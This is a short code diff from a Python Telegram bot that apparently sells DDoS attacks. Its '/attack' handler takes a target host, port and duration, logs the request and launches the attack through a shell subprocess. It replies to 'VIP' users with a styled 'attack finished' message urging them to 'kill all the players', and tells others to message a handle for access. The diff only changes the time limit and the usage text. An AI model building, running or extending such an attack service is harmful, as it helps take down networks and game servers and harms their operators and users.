@@ -330,8 +330,8 @@ def handle_attack(message):
             target = command[1]
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
-            if time > 700:
-                response = "𝐄𝐫𝐫𝐨𝐫: 𝐓𝐢𝐦𝐞 𝐢𝐧𝐭𝐞𝐫𝐯𝐚𝐥 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐥𝐞𝐬𝐬 𝐭𝐡𝐚𝐧 700 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
+            if time > 240:
+                response = "𝐄𝐫𝐫𝐨𝐫: 𝐓𝐢𝐦𝐞 𝐢𝐧𝐭𝐞𝐫𝐯𝐚𝐥 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐥𝐞𝐬𝐬 𝐭𝐡𝐚𝐧 240 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
             else:
                 record_command_logs(user_id, '/attack', target, port, time)
                 log_command(user_id, target, port, time)
@@ -347,7 +347,7 @@ def handle_attack(message):
                     subprocess.run(full_command, shell=True)
                 response = f"💎 𝐃𝐄𝐀𝐑 𝐕𝐈𝐏 𝐔𝐒𝐄𝐑 {user_name} 💎\n\n🛑 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 🛑\n\n🎯 𝐇𝐨𝐬𝐭: {target}\n🔗 𝐏𝐨𝐫𝐭: {port}\n⏳ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n⚙️ 𝐌𝐞𝐭𝐡𝐨𝐝 : PREMIUM\n\n📝 𝐀𝐝𝐯𝐢𝐜𝐞 :-\n📶 𝐘𝐨𝐮𝐫 𝐈𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐈𝐬 𝐍𝐨𝐫𝐦𝐚𝐥 𝐍𝐨𝐰 𝐊𝐢𝐥𝐥 𝐀𝐥𝐥 𝐓𝐡𝐞 𝐏𝐥𝐚𝐲𝐞𝐫'𝐬 𝐀𝐧𝐝 𝐆𝐢𝐯𝐞 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤𝐬 𝐈𝐧"
         else:
-            response = "⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐅𝐨𝐫𝐦𝐚𝐭 ⚠️\n\n✅ 𝐔𝐬𝐚𝐠𝐞 :- /attack <𝐡𝐨𝐬𝐭> <𝐩𝐨𝐫𝐭> <𝐭𝐢𝐦𝐞>\n\n✅ 𝐅𝐨𝐫 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 :- /attack 127.0.0.0 8700 120 JOIN OUR CHANNEL https://t.me/+GbQoCdFp6SczNjQ1"  # Updated command syntax
+            response = "⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐅𝐨𝐫𝐦𝐚𝐭 ⚠️\n\n✅ 𝐔𝐬𝐚𝐠𝐞 :- /attack <𝐡𝐨𝐬𝐭> <𝐩𝐨𝐫𝐭> <𝐭𝐢𝐦𝐞>\n\n✅ 𝐅𝐨𝐫 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 :- /attack 127.0.0.0 8700 240"  # Updated command syntax
     else:
         response = "𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @SHIVAMXRAJ 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨"
 
